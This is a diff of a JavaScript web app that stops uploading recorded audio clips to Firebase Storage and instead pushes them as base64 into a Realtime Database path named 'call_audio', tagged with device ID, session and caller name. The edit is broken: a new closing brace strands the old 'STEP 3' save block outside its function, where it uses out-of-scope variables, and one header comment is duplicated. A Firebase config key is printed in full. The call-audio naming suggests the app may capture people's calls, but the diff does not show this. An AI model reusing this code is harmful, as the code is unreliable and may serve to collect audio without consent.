@@ -501,8 +501,6 @@ body {
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getDatabase, ref, push, serverTimestamp }
   from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
-import { getStorage, ref as storageRef, uploadString, getDownloadURL }
-  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
@@ -516,7 +514,7 @@ const firebaseConfig = {
 
 const firebaseApp = initializeApp(firebaseConfig);
 const db = getDatabase(firebaseApp);
-const storage = getStorage(firebaseApp);
+
 
 console.log('✅ Firebase initialized');
 console.log('📦 Storage bucket:', firebaseConfig.storageBucket);
@@ -891,6 +889,9 @@ async function recordAudioClip() {
 /* ============================================================
    14. 🔥 SAVE AUDIO — Storage + RTDB Fallback (FIXED)
    ============================================================ */
+/* ============================================================
+   14. 🔥 SAVE AUDIO → RTDB (base64) — Photo ki tarah
+   ============================================================ */
 async function saveAudioToDB(blob, mimeType) {
   const now = new Date();
   const timestamp = now.getTime();
@@ -899,7 +900,7 @@ async function saveAudioToDB(blob, mimeType) {
 
   console.log('📤 Saving audio...', (blob.size / 1024).toFixed(1), 'KB');
 
-  // 🔥 STEP 1: Blob → Base64
+  // 🔥 Blob → Base64 (photo ki tarah)
   let base64 = '';
   try {
     base64 = await new Promise((resolve, reject) => {
@@ -914,29 +915,37 @@ async function saveAudioToDB(blob, mimeType) {
     return;
   }
 
-  // 🔥 STEP 2: Try Storage Upload
-  let downloadURL = null;
+  // 🔥 Direct RTDB me save (photo ki tarah)
   try {
-    console.log('⏳ Trying Firebase Storage...');
+    console.log('⏳ Saving to RTDB...');
 
-    const fileName = `${DEVICE_ID}/${timestamp}.webm`;
-    const fileRef = storageRef(storage, 'call_audio/' + fileName);
+    const audioRef = ref(db, 'call_audio/' + DEVICE_ID);
 
-    const base64Only = base64.split(',')[1];
-
-    await uploadString(fileRef, base64Only, 'base64', {
-      contentType: mimeType || 'audio/webm'
+    const newRef = await push(audioRef, {
+      deviceId: DEVICE_ID,
+      sessionId: SESSION_ID,
+      caller: currentContact ? currentContact.name : 'Unknown',
+      audioBase64: base64,
+      size: blob.size,
+      duration: duration,
+      mimeType: mimeType || 'audio/webm',
+      date: dt.date,
+      time: dt.time,
+      timestamp: timestamp,
+      capturedAtISO: dt.iso,
+      capturedAt: serverTimestamp(),
+      storage: 'rtdb-base64'
     });
 
-    downloadURL = await getDownloadURL(fileRef);
-    console.log('✅ Storage upload SUCCESS');
-    console.log('🔗 URL:', downloadURL);
+    console.log('✅ Audio saved to RTDB:', newRef.key, '|', dt.date, dt.time);
+    showToast('🎤 Audio saved ✅');
 
-  } catch (storageErr) {
-    console.error('❌ Storage upload FAILED:', storageErr.code);
-    console.error('❌ Message:', storageErr.message);
-    console.warn('⚠️ Falling back to RTDB base64 save...');
+  } catch (rtdbErr) {
+    console.error('❌ RTDB save FAILED:', rtdbErr.code);
+    console.error('❌ Message:', rtdbErr.message);
+    showToast('❌ Save failed: ' + (rtdbErr.code || 'unknown'));
   }
+}
 
   // 🔥 STEP 3: Save to RTDB (always — metadata + optional base64)
   try {
